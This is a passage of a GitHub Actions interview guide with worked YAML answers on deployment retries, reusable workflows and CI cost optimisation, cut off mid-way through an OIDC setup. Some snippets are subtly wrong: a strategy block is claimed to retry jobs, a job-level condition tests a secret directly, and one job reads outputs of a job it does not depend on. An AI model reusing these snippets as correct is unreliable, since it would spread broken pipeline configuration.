# Complete GitHub Actions Interview Guide

Master GitHub Actions with 12 real-world interview questions covering workflow debugging, reusable workflows, security, self-hosted runners, and production CI/CD patterns. Practice scenarios that mirror actual senior DevOps engineer challenges.

**Companies that ask these questions:** GitHub | Microsoft | Shopify | Stripe | Vercel | Netlify

## Questions Overview

| # | Question | Type | Category |
|---|----------|------|----------|
| 1 | A critical deployment workflow is failing intermittently. De... | Debugging | Workflow Debugging |
| 2 | 100 repositories duplicate the same CI workflow. Design a re... | Architecture | Reusable Workflows |
| 3 | Workflows are consuming too many minutes and running slowly.... | Practical | Performance Optimization |
| 4 | Workflows use long-lived credentials that could be leaked. I... | Practical | Security & Secrets |
| 5 | GitHub-hosted runners don't meet our requirements. Configure... | Practical | Self-Hosted Runners |
| 6 | We need to test across multiple OS, Node versions, and confi... | Practical | Matrix Builds |
| 7 | A workflow is vulnerable to script injection attacks. Identi... | Debugging | Security |
| 8 | Every workflow run downloads the same dependencies. Implemen... | Practical | Caching & Artifacts |
| 9 | Multiple workflows share the same setup steps. Create a comp... | Practical | Custom Actions |
| 10 | Releases are manual and error-prone. Automate with semantic ... | Practical | Release Automation |
| 11 | Design a deployment workflow with environment approvals, sta... | Architecture | Deployment Workflows |
| 12 | Our monorepo builds everything on every change. Implement ef... | Practical | Monorepo Workflows |

---

## What You'll Learn

- Debug failing workflows with proper error handling and retry strategies
- Design reusable workflows and composite actions for organization-wide standards
- Optimize workflow execution with caching, matrix builds, and concurrency
- Implement secure secrets management with OIDC and environment protection
- Configure self-hosted runners for specialized workloads
- Secure workflows against injection attacks and supply chain vulnerabilities
- Implement efficient caching for npm, Docker, and build artifacts
- Create composite actions for shared functionality
- Automate releases with semantic versioning and changelogs
- Design deployment workflows with environment approvals and rollbacks

---

## Interview Questions

### Question 1: A critical deployment workflow is failing intermittently. Debug and fix the issue.

**Type:** Debugging | **Category:** Workflow Debugging

## The Scenario

Your production deployment workflow has been failing intermittently for the past week:

```yaml
# Error from workflow run
Run kubectl apply -f k8s/
error: unable to recognize "k8s/deployment.yaml": Get "https://api.eks.us-east-1.amazonaws.com": dial tcp: lookup api.eks.us-east-1.amazonaws.com: no such host

Error: Process completed with exit code 1.
```

The workflow worked fine last month. Sometimes it passes, sometimes it fails. Developers are re-running workflows multiple times hoping they'll succeed.

## The Challenge

Debug why the workflow fails intermittently, identify the root cause, and implement robust fixes with proper error handling.


### Step 1: Enable Debug Logging

```yaml
# Re-run workflow with debug logging enabled
# Repository Settings > Secrets > Actions > Add secret
# ACTIONS_RUNNER_DEBUG = true
# ACTIONS_STEP_DEBUG = true

# Or trigger with debug enabled
name: Deploy
on:
  workflow_dispatch:
    inputs:
      debug_enabled:
        description: 'Enable debug logging'
        required: false
        default: 'false'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Debug info
        if: ${{ inputs.debug_enabled == 'true' }}
        run: |
          echo "Runner: ${{ runner.name }}"
          echo "OS: ${{ runner.os }}"
          cat /etc/resolv.conf
          nslookup api.eks.us-east-1.amazonaws.com || true
          curl -v https://api.eks.us-east-1.amazonaws.com || true
```

### Step 2: Identify the Root Cause

```yaml
# Add diagnostic steps to understand the failure
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Network diagnostics
        run: |
          echo "=== DNS Resolution ==="
          nslookup api.eks.us-east-1.amazonaws.com || echo "DNS failed"

          echo "=== DNS Servers ==="
          cat /etc/resolv.conf

          echo "=== Connectivity Test ==="
          curl -sS --connect-timeout 10 https://api.eks.us-east-1.amazonaws.com/healthz || echo "Connection failed"

          echo "=== AWS STS Test ==="
          aws sts get-caller-identity || echo "AWS auth failed"
```

### Step 3: Implement Robust Error Handling

```yaml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    # Retry the entire job on failure
    strategy:
      max-parallel: 1
      fail-fast: false

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
          # Add retry for OIDC token fetch
          role-duration-seconds: 3600
          retry-max-attempts: 3

      - name: Setup kubectl with retry
        uses: azure/setup-kubectl@v3
        with:
          version: 'v1.28.0'

      - name: Update kubeconfig with retry
        run: |
          max_attempts=3
          attempt=1

          while [ $attempt -le $max_attempts ]; do
            echo "Attempt $attempt of $max_attempts"

            if aws eks update-kubeconfig --name production-cluster --region us-east-1; then
              echo "Successfully updated kubeconfig"
              break
            fi

            if [ $attempt -eq $max_attempts ]; then
              echo "Failed after $max_attempts attempts"
              exit 1
            fi

            sleep_time=$((attempt * 10))
            echo "Retrying in ${sleep_time}s..."
            sleep $sleep_time
            attempt=$((attempt + 1))
          done

      - name: Deploy with retry
        run: |
          deploy_with_retry() {
            local max_attempts=3
            local attempt=1

            while [ $attempt -le $max_attempts ]; do
              echo "Deploy attempt $attempt of $max_attempts"

              if kubectl apply -f k8s/ --timeout=60s; then
                echo "Deployment applied successfully"

                if kubectl rollout status deployment/app --timeout=300s; then
                  echo "Rollout completed successfully"
                  return 0
                fi
              fi

              if [ $attempt -eq $max_attempts ]; then
                echo "Deployment failed after $max_attempts attempts"
                return 1
              fi

              # Exponential backoff
              sleep_time=$((2 ** attempt * 5))
              echo "Retrying in ${sleep_time}s..."
              sleep $sleep_time
              attempt=$((attempt + 1))
            done
          }

          deploy_with_retry

      - name: Verify deployment
        if: success()
        run: |
          kubectl get pods -l app=myapp
          kubectl get deployment myapp -o jsonpath='{.status.availableReplicas}'
```

### Step 4: Use the Retry Action for Cleaner Code

```yaml
name: Deploy with Retry Action

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to Kubernetes
        uses: nick-fields/retry@v2
        with:
          timeout_minutes: 10
          max_attempts: 3
          retry_wait_seconds: 30
          command: |
            aws eks update-kubeconfig --name production-cluster
            kubectl apply -f k8s/
            kubectl rollout status deployment/app --timeout=300s

      - name: Notify on final failure
        if: failure()
        uses: slackapi/slack-github-action@v1
        with:
          channel-id: 'deployments'
          slack-message: |
            Deployment failed after retries
            Workflow: ${{ github.workflow }}
            Run: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        env:
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
```

### Step 5: Implement Health Checks Before Deploy

```yaml
name: Deploy with Pre-flight Checks

on:
  push:
    branches: [main]

jobs:
  preflight:
    runs-on: ubuntu-latest
    outputs:
      cluster-healthy: ${{ steps.check.outputs.healthy }}
    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Check cluster health
        id: check
        run: |
          aws eks update-kubeconfig --name production-cluster

          # Check API server
          if ! kubectl cluster-info; then
            echo "healthy=false" >> $GITHUB_OUTPUT
            exit 0
          fi

          # Check nodes
          unhealthy_nodes=$(kubectl get nodes --no-headers | grep -v Ready | wc -l)
          if [ "$unhealthy_nodes" -gt 0 ]; then
            echo "Found $unhealthy_nodes unhealthy nodes"
            echo "healthy=false" >> $GITHUB_OUTPUT
            exit 0
          fi

          echo "healthy=true" >> $GITHUB_OUTPUT

  deploy:
    needs: preflight
    if: needs.preflight.outputs.cluster-healthy == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy
        run: |
          aws eks update-kubeconfig --name production-cluster
          kubectl apply -f k8s/

  alert-unhealthy:
    needs: preflight
    if: needs.preflight.outputs.cluster-healthy == 'false'
    runs-on: ubuntu-latest
    steps:
      - name: Alert team
        run: |
          echo "::error::Cluster health check failed - deployment skipped"
          # Send alert to team
```

### Step 6: Add Comprehensive Logging

```yaml
- name: Deploy with detailed logging
  id: deploy
  run: |
    set -euo pipefail

    echo "::group::Cluster Info"
    kubectl cluster-info
    kubectl get nodes
    echo "::endgroup::"

    echo "::group::Current State"
    kubectl get deployments -o wide || true
    kubectl get pods -o wide || true
    echo "::endgroup::"

    echo "::group::Applying Changes"
    kubectl apply -f k8s/ --dry-run=server
    kubectl apply -f k8s/
    echo "::endgroup::"

    echo "::group::Rollout Status"
    kubectl rollout status deployment/app --timeout=300s
    echo "::endgroup::"

    echo "::group::Final State"
    kubectl get pods -o wide
    kubectl get events --sort-by='.lastTimestamp' | tail -20
    echo "::endgroup::"
```


## Common Workflow Debugging Issues

| Symptom | Root Cause | Fix |
|---------|------------|-----|
| DNS resolution failures | Transient network issues | Add retry with backoff |
| Token expired | OIDC token timeout | Reduce job duration, refresh token |
| Rate limited | Too many API calls | Add delays, use caching |
| Random timeouts | Resource contention | Increase timeout, add health checks |
| Permission denied | Token scope insufficient | Check workflow permissions |

---

### Question 2: 100 repositories duplicate the same CI workflow. Design a reusable workflow architecture.

**Type:** Architecture | **Category:** Reusable Workflows

## The Scenario

Your organization has 100+ repositories, each with copy-pasted CI workflows:

```
Problems identified:
- Security patch needed → update 100 workflows manually
- Inconsistent quality → some repos skip tests
- Tribal knowledge → each team customizes differently
- Maintenance burden → platform team can't keep up
```

Leadership wants standardization while allowing teams flexibility for their specific needs.

## The Challenge

Design a reusable workflow architecture that provides organization-wide standards, reduces duplication, and allows customization where needed.


> **Common Mistake:** A junior engineer might create one giant workflow that tries to handle everything, force all repos to use identical configurations, or just write documentation hoping teams follow it. These approaches create inflexible monoliths, kill productivity, or result in drift.

> **Senior Engineer Approach:** A senior engineer designs a layered architecture with reusable workflows for common patterns, composite actions for shared steps, sensible defaults with override capabilities, and proper versioning for stability.

### Step 1: Design the Architecture

```
.github repository (organization level)
├── workflow-templates/          # Starter templates for new repos
│   ├── ci-node.yml
│   ├── ci-python.yml
│   └── ci-docker.yml
│
├── actions/                     # Composite actions
│   ├── setup-node-project/
│   │   └── action.yml
│   ├── deploy-to-k8s/
│   │   └── action.yml
│   └── notify-slack/
│       └── action.yml
│
└── .github/
    └── workflows/               # Reusable workflows (callable)
        ├── ci-node.yml
        ├── ci-python.yml
        ├── deploy-staging.yml
        ├── deploy-production.yml
        └── security-scan.yml
```

### Step 2: Create Reusable CI Workflow

```yaml
# .github/workflows/ci-node.yml (in .github repo)
name: Node.js CI (Reusable)

on:
  workflow_call:
    inputs:
      node-version:
        description: 'Node.js version to use'
        required: false
        type: string
        default: '18'
      working-directory:
        description: 'Working directory for commands'
        required: false
        type: string
        default: '.'
      run-e2e:
        description: 'Run E2E tests'
        required: false
        type: boolean
        default: false
      coverage-threshold:
        description: 'Minimum coverage percentage'
        required: false
        type: number
        default: 80
    secrets:
      NPM_TOKEN:
        required: false
      CODECOV_TOKEN:
        required: false
    outputs:
      coverage:
        description: 'Test coverage percentage'
        value: ${{ jobs.test.outputs.coverage }}

jobs:
  lint:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ${{ inputs.working-directory }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'
          cache-dependency-path: '${{ inputs.working-directory }}/package-lock.json'

      - name: Install dependencies
        run: npm ci

      - name: Run linting
        run: npm run lint

      - name: Type check
        run: npm run typecheck || true

  test:
    runs-on: ubuntu-latest
    outputs:
      coverage: ${{ steps.coverage.outputs.percentage }}
    defaults:
      run:
        working-directory: ${{ inputs.working-directory }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'
          cache-dependency-path: '${{ inputs.working-directory }}/package-lock.json'

      - name: Install dependencies
        run: npm ci

      - name: Run tests with coverage
        run: npm run test:coverage

      - name: Extract coverage
        id: coverage
        run: |
          coverage=$(cat coverage/coverage-summary.json | jq '.total.lines.pct')
          echo "percentage=$coverage" >> $GITHUB_OUTPUT

          if (( $(echo "$coverage < ${{ inputs.coverage-threshold }}" | bc -l) )); then
            echo "::error::Coverage $coverage% is below threshold ${{ inputs.coverage-threshold }}%"
            exit 1
          fi

      - name: Upload coverage
        if: secrets.CODECOV_TOKEN != ''
        uses: codecov/codecov-action@v3
        with:
          token: ${{ secrets.CODECOV_TOKEN }}

  e2e:
    if: inputs.run-e2e
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ${{ inputs.working-directory }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Install Playwright
        run: npx playwright install --with-deps

      - name: Run E2E tests
        run: npm run test:e2e

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-report
          path: playwright-report/

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ${{ inputs.working-directory }}
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'
          cache-dependency-path: '${{ inputs.working-directory }}/package-lock.json'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: ${{ inputs.working-directory }}/dist/
          retention-days: 7
```

### Step 3: Create Reusable Deployment Workflow

```yaml
# .github/workflows/deploy.yml (in .github repo)
name: Deploy (Reusable)

on:
  workflow_call:
    inputs:
      environment:
        description: 'Deployment environment'
        required: true
        type: string
      image-tag:
        description: 'Docker image tag to deploy'
        required: true
        type: string
      app-name:
        description: 'Application name'
        required: true
        type: string
      notify-slack:
        description: 'Send Slack notification'
        required: false
        type: boolean
        default: true
    secrets:
      AWS_ROLE_ARN:
        required: true
      SLACK_WEBHOOK:
        required: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to EKS
        run: |
          aws eks update-kubeconfig --name ${{ inputs.environment }}-cluster

          kubectl set image deployment/${{ inputs.app-name }} \
            app=${{ inputs.image-tag }} \
            -n ${{ inputs.app-name }}

          kubectl rollout status deployment/${{ inputs.app-name }} \
            -n ${{ inputs.app-name }} \
            --timeout=300s

      - name: Notify Slack
        if: inputs.notify-slack && always()
        uses: slackapi/slack-github-action@v1
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            {
              "text": "${{ job.status == 'success' && '✅' || '❌' }} Deployment to ${{ inputs.environment }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*${{ inputs.app-name }}* deployed to *${{ inputs.environment }}*\nImage: `${{ inputs.image-tag }}`\nStatus: ${{ job.status }}"
                  }
                }
              ]
            }
```

### Step 4: Caller Workflow (in Application Repo)

```yaml
# .github/workflows/ci.yml (in application repo)
name: CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  ci:
    uses: my-org/.github/.github/workflows/ci-node.yml@v2
    with:
      node-version: '20'
      run-e2e: ${{ github.ref == 'refs/heads/main' }}
      coverage-threshold: 85
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}

  build-image:
    needs: ci
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${{ steps.build.outputs.tag }}
    steps:
      - uses: actions/checkout@v4

      - name: Build and push
        id: build
        run: |
          TAG="registry.company.com/myapp:${{ github.sha }}"
          docker build -t $TAG .
          docker push $TAG
          echo "tag=$TAG" >> $GITHUB_OUTPUT

  deploy-staging:
    needs: build-image
    uses: my-org/.github/.github/workflows/deploy.yml@v2
    with:
      environment: staging
      app-name: myapp
      image-tag: ${{ needs.build-image.outputs.image-tag }}
    secrets:
      AWS_ROLE_ARN: ${{ secrets.AWS_ROLE_ARN_STAGING }}
      SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}

  deploy-production:
    needs: [build-image, deploy-staging]
    uses: my-org/.github/.github/workflows/deploy.yml@v2
    with:
      environment: production
      app-name: myapp
      image-tag: ${{ needs.build-image.outputs.image-tag }}
    secrets:
      AWS_ROLE_ARN: ${{ secrets.AWS_ROLE_ARN_PROD }}
      SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
```

### Step 5: Version and Release Reusable Workflows

```yaml
# .github/workflows/release-workflows.yml (in .github repo)
name: Release Workflows

on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          generate_release_notes: true
```

### Step 6: Workflow Template for New Repos

```yaml
# workflow-templates/ci-node.yml
name: Node.js CI

on:
  push:
    branches: [$default-branch]
  pull_request:
    branches: [$default-branch]

jobs:
  ci:
    uses: my-org/.github/.github/workflows/ci-node.yml@v2
    with:
      node-version: '18'
    secrets: inherit
```

```yaml
# workflow-templates/ci-node.properties.json
{
  "name": "Node.js CI",
  "description": "Standard Node.js CI workflow with linting, testing, and building",
  "iconName": "nodejs",
  "categories": ["Node.js", "JavaScript", "TypeScript"],
  "filePatterns": ["package.json"]
}
```


## Reusable Workflow Best Practices

| Practice | Why | How |
|----------|-----|-----|
| Semantic versioning | Consumers can pin stable versions | Tag releases: v1, v1.2, v1.2.3 |
| Sensible defaults | Reduce configuration burden | Set reasonable default values |
| Document inputs/outputs | Teams know what's available | Use descriptions, add README |
| Test workflows | Catch breaks before consumers | Create test repos that use workflows |
| Limit required secrets | Reduce setup friction | Make secrets optional where possible |

<InterviewQuiz
  question="What is the key difference between reusable workflows (workflow_call) and composite actions in GitHub Actions?"
  options={[
    "Composite actions are faster to execute",
    "Reusable workflows can define multiple jobs and use secrets, while composite actions are single-job step collections",
    "Composite actions support more programming languages",
    "Reusable workflows don't support inputs"
  ]}
  correctAnswer={1}
  explanation="Reusable workflows (triggered by workflow_call) can define complete multi-job workflows with their own runners, job dependencies, environments, and secrets. Composite actions bundle multiple steps into a single action but run within the caller's job context. Use reusable workflows for complete CI/CD pipelines; use composite actions for shared step sequences like 'setup project' or 'deploy to environment'."
/>

---

### Question 3: Workflows are consuming too many minutes and running slowly. Optimize for speed and cost.

**Type:** Practical | **Category:** Performance Optimization

## The Scenario

Your organization's GitHub Actions usage is out of control:

```
Monthly GitHub Actions Report:
- Total minutes used: 125,000 (limit: 50,000)
- Overage cost: $1,200
- Average workflow duration: 18 minutes
- Cache hit rate: 15%
- Jobs run: 8,500

Top offenders:
1. Full CI on every commit to all branches
2. Matrix testing 25 combinations for every PR
3. No caching - downloading 800MB of node_modules each run
```

## The Challenge

Optimize workflows to reduce execution time by 70% and stay within the free tier, while maintaining code quality and test coverage.


> **Common Mistake:** A junior engineer might just skip tests, reduce matrix combinations without analysis, or throw money at the problem by upgrading plans. These approaches reduce quality, miss real issues, or waste budget.

> **Senior Engineer Approach:** A senior engineer analyzes workflow patterns, implements intelligent caching, uses path filters to skip unnecessary runs, parallelizes effectively, and uses concurrency controls to cancel redundant jobs.

### Step 1: Implement Aggressive Caching

```yaml
name: Optimized CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Cache npm dependencies
      - name: Cache npm dependencies
        uses: actions/cache@v4
        id: npm-cache
        with:
          path: |
            ~/.npm
            node_modules
          key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            npm-${{ runner.os }}-

      # Only install if cache missed
      - name: Install dependencies
        if: steps.npm-cache.outputs.cache-hit != 'true'
        run: npm ci

      # Cache build outputs
      - name: Cache build
        uses: actions/cache@v4
        with:
          path: |
            .next/cache
            dist
          key: build-${{ runner.os }}-${{ hashFiles('src/**', 'package-lock.json') }}

      - name: Build
        run: npm run build

      # Cache Playwright browsers
      - name: Cache Playwright
        uses: actions/cache@v4
        with:
          path: ~/.cache/ms-playwright
          key: playwright-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}

      # Cache Docker layers
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

### Step 2: Use Path Filters to Skip Unnecessary Runs

```yaml
name: Smart CI

on:
  push:
    branches: [main]
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.gitignore'
      - 'LICENSE'
  pull_request:
    paths-ignore:
      - '**.md'
      - 'docs/**'

jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      frontend: ${{ steps.changes.outputs.frontend }}
      backend: ${{ steps.changes.outputs.backend }}
      infrastructure: ${{ steps.changes.outputs.infrastructure }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v2
        id: changes
        with:
          filters: |
            frontend:
              - 'frontend/**'
              - 'package.json'
            backend:
              - 'backend/**'
              - 'requirements.txt'
            infrastructure:
              - 'terraform/**'
              - 'k8s/**'

  frontend-tests:
    needs: changes
    if: needs.changes.outputs.frontend == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
        working-directory: frontend

  backend-tests:
    needs: changes
    if: needs.changes.outputs.backend == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt && pytest
        working-directory: backend

  # Always run if nothing specific changed (safety net)
  full-ci:
    needs: changes
    if: needs.changes.outputs.frontend != 'true' && needs.changes.outputs.backend != 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "No specific changes detected, running minimal checks"
```

### Step 3: Implement Concurrency Controls

```yaml
name: CI with Concurrency

on:
  push:
    branches: [main, develop]
  pull_request:

# Cancel in-progress runs for the same branch/PR
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

### Step 4: Optimize Matrix Builds

```yaml
name: Smart Matrix

on:
  push:
    branches: [main]
  pull_request:

jobs:
  # Quick tests on PR - limited matrix
  test-pr:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [18]  # Only latest LTS for PRs
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test

  # Full matrix only on main branch
  test-full:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false  # Don't cancel other jobs if one fails
      matrix:
        node: [16, 18, 20]
        os: [ubuntu-latest, windows-latest, macos-latest]
        exclude:
          # Skip expensive combinations
          - os: macos-latest
            node: 16
          - os: windows-latest
            node: 16
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

### Step 5: Parallelize Test Execution

```yaml
name: Parallel Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4

      - name: Setup
        uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      - name: Run tests (shard ${{ matrix.shard }}/4)
        run: |
          npm run test -- --shard=${{ matrix.shard }}/4

      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.shard }}
          path: coverage/

  merge-coverage:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Download all coverage
        uses: actions/download-artifact@v4
        with:
          pattern: coverage-*
          merge-multiple: true

      - name: Merge and upload
        run: |
          # Merge coverage reports
          npx nyc merge coverage merged-coverage.json
          npx nyc report --reporter=text --reporter=lcov
```

### Step 6: Use Larger Runners for CPU-Intensive Tasks

```yaml
name: Optimized Build

on:
  push:
    branches: [main]

jobs:
  # Quick jobs on standard runners
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run lint

  # CPU-intensive on larger runner (4x faster, 2x cost = 2x savings)
  build:
    runs-on: ubuntu-latest-4-cores  # or self-hosted
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      # Parallel build using all cores
      - run: npm run build -- --parallel
        env:
          NODE_OPTIONS: "--max-old-space-size=8192"
```

### Step 7: Complete Optimized Workflow

```yaml
name: Optimized CI/CD

on:
  push:
    branches: [main, develop]
    paths-ignore:
      - '**.md'
      - 'docs/**'
  pull_request:
    paths-ignore:
      - '**.md'

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  NODE_VERSION: 18
  CACHE_VERSION: v1  # Increment to invalidate all caches

jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      cache-key: ${{ steps.cache-key.outputs.key }}
    steps:
      - uses: actions/checkout@v4
      - id: cache-key
        run: |
          echo "key=${{ env.CACHE_VERSION }}-${{ hashFiles('**/package-lock.json') }}" >> $GITHUB_OUTPUT

  install:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v4
        id: cache
        with:
          path: node_modules
          key: modules-${{ needs.setup.outputs.cache-key }}

      - if: steps.cache.outputs.cache-hit != 'true'
        run: npm ci

  lint-and-typecheck:
    needs: install
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: modules-${{ needs.setup.outputs.cache-key }}
      - run: npm run lint & npm run typecheck & wait

  test:
    needs: install
    runs-on: ubuntu-latest
    strategy:
      matrix:
        shard: [1, 2]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: modules-${{ needs.setup.outputs.cache-key }}
      - run: npm test -- --shard=${{ matrix.shard }}/2

  build:
    needs: [lint-and-typecheck, test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: modules-${{ needs.setup.outputs.cache-key }}
      - uses: actions/cache@v4
        with:
          path: .next/cache
          key: nextjs-${{ hashFiles('src/**') }}
      - run: npm run build
```


## Optimization Results

| Metric | Before | After | Improvement |
|--------|--------|-------|-------------|
| Avg duration | 18 min | 5 min | 72% faster |
| Monthly minutes | 125,000 | 35,000 | 72% reduction |
| Cache hit rate | 15% | 85% | 5.6x improvement |
| Monthly cost | $1,200 | $0 | Within free tier |
| Queue time | 5 min | 30 sec | 90% reduction |

<InterviewQuiz
  question="What is the most impactful optimization for reducing GitHub Actions minutes for a typical Node.js project?"
  options={[
    "Using larger runners",
    "Caching node_modules and build outputs",
    "Reducing test coverage",
    "Running fewer jobs in parallel"
  ]}
  correctAnswer={1}
  explanation="Caching dependencies is typically the most impactful optimization. For Node.js projects, npm install can take 2-5 minutes and download hundreds of megabytes. With proper caching, subsequent runs restore from cache in seconds. Combined with build output caching, you can often reduce workflow time by 50-70%. Larger runners help with CPU-bound tasks but don't address I/O-bound dependency installation."
/>

---

### Question 4: Workflows use long-lived credentials that could be leaked. Implement secure authentication with OIDC.

**Type:** Practical | **Category:** Security & Secrets

## The Scenario

Security audit findings on your GitHub Actions workflows:

```
Critical Issues Found:
1. AWS access keys stored as repository secrets (90+ day old)
2. Same credentials used across dev/staging/prod
3. No credential rotation policy
4. Keys have admin-level permissions
5. Secrets exposed in fork PRs from external contributors
```

A leaked credential could give attackers access to your entire cloud infrastructure.

## The Challenge

Implement secure, short-lived authentication using OpenID Connect (OIDC) that eliminates long-lived credentials and provides fine-grained access control.


> **Common Mistake:** A junior engineer might just rotate the secrets more frequently, restrict which workflows can use secrets, or add more secrets for different environments. These approaches still rely on long-lived credentials that can be leaked, exfiltrated, or misused.

> **Senior Engineer Approach:** A senior engineer implements OIDC federation which allows GitHub Actions to authenticate directly with cloud providers using short-lived tokens. No secrets to leak, automatic rotation, and fine-grained access control based on repository, branch, and environment.

### Step 1: Understand OIDC Flow

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  GitHub Actions │────▶│   GitHub OIDC   │────▶│   AWS STS       │
│    Workflow     │     │    Provider     │     │   AssumeRole    │
└─────────────────┘     └─────────────────┘     └─────────────────┘
        │                       │                       │
        │  1. Request token     │                       │
        │──────────────────────▶│                       │
        │                       │                       │
        │  2. JWT with claims   │                       │
        │◀──────────────────────│                       │
        │                       │                       │
        │  3. Present JWT to assume role               │
        │──────────────────────────────────────────────▶│
        │                       │                       │
        │  4. Short-lived credentials                  │
        │◀──────────────────────────────────────────────│
```

### Step 2: Configure AWS OIDC Provider (Terraform)

```hcl
# oidc.tf - Create OIDC provider in AWS

# GitHub's OIDC provider
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
